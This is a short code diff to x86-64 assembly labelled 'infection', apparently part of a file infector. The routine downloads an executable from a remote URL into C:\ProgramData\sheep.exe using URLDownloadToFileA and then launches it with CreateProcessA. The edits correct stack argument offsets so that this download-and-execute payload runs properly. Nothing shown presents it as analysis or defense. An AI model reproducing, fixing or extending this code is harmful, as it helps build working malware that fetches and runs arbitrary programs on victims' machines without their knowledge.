@@ -65,7 +65,7 @@ infection__data:
    lea rdx, [rbx+(infection__data__download_url-infection__data__start)] ; big honkin github url
    lea r8, [rbx+(infection__data__sheep-infection__data__start)] ; the sheep executable
    xor r9d,r9d
-   mov [rsp+0x28],rcx
+   mov [rsp+0x20],rcx
    call r12                     ; URLDownloadToFileA(nullptr, "evil_sheep_url.exe", "C:\\ProgramData\\sheep.exe", 0, nullptr)
    test eax,eax
    jnz infection__end           ; URLDownloadToFileA returning nonzero is an error
@@ -76,8 +76,8 @@ infection__payload_exists:
    xor r8d,r8d
    xor r9d,r9d
    xorps xmm0,xmm0
-   movups [rsp+0x28],xmm0
-   mov [rsp+0x38],rcx
+   movups [rsp+0x20],xmm0
+   movups [rsp+0x30],xmm0
    lea rax, [rsp+0x70]
    mov [rsp+0x40], rax
    lea rax, [rsp+0x50]
@@ -91,6 +91,7 @@ infection__payload_exists:
    movups [rsp+0xa4],xmm0
    movups [rsp+0xb4],xmm0
    movups [rsp+0xc4],xmm0
+   mov [rsp+0xd4],ecx
    call rbp                     ; CreateProcessA(NULL, sheep_exe, NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &proc_info)
    
 infection__end:
